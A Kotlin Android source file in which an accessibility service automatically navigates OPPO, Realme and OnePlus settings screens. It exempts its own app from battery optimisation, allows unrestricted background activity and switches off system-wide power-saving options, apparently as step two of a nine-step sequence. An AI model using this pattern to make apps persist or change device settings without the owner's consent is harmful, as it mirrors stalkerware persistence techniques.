package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * Step 2 -- 电池优化豁免(SubBrand 分发: OPPO/Realme/OnePlus)。
 *
 * vendor `m212337e1` dispatcher:
 *   REALME -> mRealme
 *   ONEPLUS -> mOnePlus
 *   OPPO/OPLUS -> mOppo
 */
class OppoStep2Battery(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep2Battery"
    }

    /** Step 2 入口 -- SubBrand 分发 */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(steps.ctx, OppoStepCompletionStore.Keys.STEP2_BATTERY)) {
            logs.add("[Step 2/9] ⏭ 24h 内已完成,跳过")
            return
        }
        logs.add("[Step 2/9] ▶ 电池优化豁免开始(subBrand=${steps.subBrand})")

        // Dispatch through steps (not this) to preserve test override behavior:
        // tests override executeBatteryOppo/Realme/OnePlus on OppoSteps.
        when (steps.subBrand) {
            OppoSubBrand.REALME -> steps.executeBatteryRealme(successes, failures, logs)
            OppoSubBrand.ONEPLUS -> steps.executeBatteryOnePlus(successes, failures, logs)
            OppoSubBrand.OPPO, OppoSubBrand.OPLUS -> steps.executeBatteryOppo(successes, failures, logs)
        }
    }

    /** OPPO/OPLUS 路径 -- SDK 分支 */
    suspend fun executeBatteryOppo(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        val sdk = android.os.Build.VERSION.SDK_INT

        if (sdk >= 35) {
            // Phase G#7: ColorOS 16(SDK>=35)捷径路径 -- 真机 dump 实锤
            logs.add("[Step 2/9] SDK=$sdk≥35 走 应用详情→耗电管理 捷径")
            ui.openAppDetails()
            ui.waitForPackage("com.android.settings", 5000L)
            ui.scrollToTop()
            delay(300L)
            steps.dumpCurrentPage("Step2")
            Log.d(TAG, "[Step2] 应用详情已打开,点击耗电管理入口")

            // 1. 在应用详情页点"耗电管理"进入子页
            val enteredPowerCtrl = ui.clickSelectorWithScroll("[text*=\"耗电管理\"][visibleToUser=true]", scrollLimit = 5)
            Log.d(TAG, "[Step2] clickSelector(耗电管理)=$enteredPowerCtrl")
            delay(1500L)

            // 2. 在耗电行为控制页点"完全允许后台行为"RadioButton
            val bgAllowed = ui.clickSelector("[text=\"完全允许后台行为\"][visibleToUser=true]") ||
                ui.clickSelector("[text=\"完全后台行为\"][visibleToUser=true]") ||
                ui.clickSelector("[text=\"允许后台运行\"][visibleToUser=true]") ||
                ui.clickSelector("[text=\"不限制应用的任何后台行为\"][visibleToUser=true]")
            Log.d(TAG, "[Step2] clickSelector(完全允许后台行为)=$bgAllowed")
            delay(500L)

            // 确认对话框(如果有)
            ui.clickSelector("[text=\"允许\"][visibleToUser=true]") || ui.clickSelector("[text=\"确定\"][visibleToUser=true]")
            delay(500L)
            // runStep 统一 HOME 清场
        } else {
            // SDK < 35 旧路径:Settings -> 电池 -> 4 级菜单
            logs.add("[Step 2/9] SDK=$sdk<35 走 Settings 4 级菜单路径")
            ui.openSettings()
            delay(800L)

            ui.clickSelectorWithScroll("[text*=\"电池\"][visibleToUser=true]", scrollLimit = 5)
            delay(600L)
            ui.navigateByHashPath(OppoBatteryPaths.OPPO_OPLUS_PATH, scrollLimit = 5)

            ui.closeSwitch("睡眠待机优化") || ui.closeSwitch("待机耗电优化")
            delay(400L)
            ui.clickSelectorWithScroll("[text*=\"耗电异常优化\"][visibleToUser=true]", scrollLimit = 3)
            delay(800L)
            ui.clickSelectorWithScroll("[text*=\"${steps.appLabel}\"][visibleToUser=true]", scrollLimit = 25)
            delay(400L)
            ui.clickSelector("[text=\"不优化\"][visibleToUser=true]")
            delay(400L)
            ui.pressBack(); ui.pressBack()
            ui.closeSwitch("省电模式")
        }

        // Phase G#8: 回验修正 -- "完全允许后台行为"是 ColorOS 自定义后台策略,
        // 不是 Android Doze 白名单(isIgnoringBatteryOptimizations 检测不到)。
        // 对齐 vendor:UI 操作完成就 mark success。
        successes.add("[Step 2/9] 电池/耗电管理 UI 操作完成")
        OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }

    /** Realme 路径(文档 2c) -- 按 SDK 分支 */
    suspend fun executeBatteryRealme(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        val sdk = android.os.Build.VERSION.SDK_INT
        logs.add("[Step 2/9] mRealme SDK=$sdk")
        ui.openSettings()
        delay(800L)
        ui.clickSelectorWithScroll("[text*=\"电池\"][visibleToUser=true]", scrollLimit = 5)
        delay(600L)

        when {
            sdk >= 36 -> {
                logs.add("[Step 2/9] Realme SDK≥36 委托 mOppo")
                executeBatteryOppo(successes, failures, logs)
                return
            }
            sdk == 35 -> {
                ui.clickSelectorWithScroll("[text*=\"省电设置\"][visibleToUser=true]", scrollLimit = 3)
                delay(400L)
                ui.closeSwitch("睡眠待机优化")
                ui.closeSwitch("自动进入省电模式")
                ui.pressBack(); ui.pressBack(); ui.pressBack()
            }
            sdk == 29 -> {
                ui.closeSwitch("省电模式")
                ui.clickSelectorWithScroll("[text*=\"智能省电场景\"][visibleToUser=true]", scrollLimit = 3)
                delay(400L)
                ui.closeSwitch("睡眠待机优化")
            }
            else -> {
                ui.navigateByHashPath(OppoBatteryPaths.REALME_LEGACY_PATH, scrollLimit = 5)
                ui.clickSelectorWithScroll("[text*=\"耗电异常优化\"][visibleToUser=true]", scrollLimit = 3)
                ui.clickSelectorWithScroll("[text*=\"${steps.appLabel}\"][visibleToUser=true]", scrollLimit = 25)
                ui.clickSelector("[text=\"不优化\"][visibleToUser=true]") || (ui.clickSelector("[text=\"待机优化\"][visibleToUser=true]") && ui.clickSelector("[text=\"关闭\"][visibleToUser=true]"))
                ui.pressBack(); ui.pressBack()
            }
        }
        successes.add("[Step 2/9] Realme 电池/耗电管理 UI 操作完成")
        OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }

    /** OnePlus 路径(文档 2b) -- 按 SDK 分支 */
    suspend fun executeBatteryOnePlus(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        val sdk = android.os.Build.VERSION.SDK_INT
        logs.add("[Step 2/9] mOnePlus SDK=$sdk")
        ui.openSettings()
        delay(800L)
        ui.clickSelectorWithScroll("[text*=\"电池\"][visibleToUser=true]", scrollLimit = 5)
        delay(600L)

        when {
            sdk >= 36 -> {
                logs.add("[Step 2/9] OnePlus SDK≥36 委托 mOppo")
                executeBatteryOppo(successes, failures, logs)
                return
            }
            sdk == 35 -> {
                ui.clickSelectorWithScroll("[text*=\"电池模式\"][visibleToUser=true]", scrollLimit = 3)
                delay(400L)
                ui.clickSelector("[text=\"均衡模式\"][visibleToUser=true]")
                delay(400L)
                ui.clickSelectorWithScroll("[text*=\"省电设置\"][visibleToUser=true]", scrollLimit = 3)
                ui.closeSwitch("自动进入省电模式")
                ui.closeSwitch("睡眠待机优化")
                ui.pressBack(); ui.pressBack()
            }
            else -> {
                ui.openAppDetails()
                ui.closeSwitch("省电模式")
                ui.clickSelector("[text=\"立即关闭\"][visibleToUser=true]")
                ui.pressBack()
                ui.clickSelectorWithScroll("[text*=\"耗电管理\"][visibleToUser=true]", scrollLimit = 3) || ui.clickSelector("[text=\"电池\"][visibleToUser=true]")
                ui.navigateByHashPath(OppoBatteryPaths.ONEPLUS_LEGACY_PATH, scrollLimit = 3)
                ui.closeSwitch("睡眠待机优化")
                ui.clickSelectorWithScroll("[text*=\"耗电异常优化\"][visibleToUser=true]", scrollLimit = 3)
                ui.clickSelectorWithScroll("[text*=\"${steps.appLabel}\"][visibleToUser=true]", scrollLimit = 25)
                ui.clickSelector("[text=\"不优化\"][visibleToUser=true]")
                ui.pressBack(); ui.pressBack(); ui.pressBack()
            }
        }
        successes.add("[Step 2/9] OnePlus 电池/耗电管理 UI 操作完成")
        OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }

    /** Phase E: 查询当前 app 是否已被 PowerManager 豁免电池优化(真实效果回验) */
    fun isIgnoringBatteryOptimizationsNow(): Boolean {
        return ui.isBatteryOptimized()
    }
}
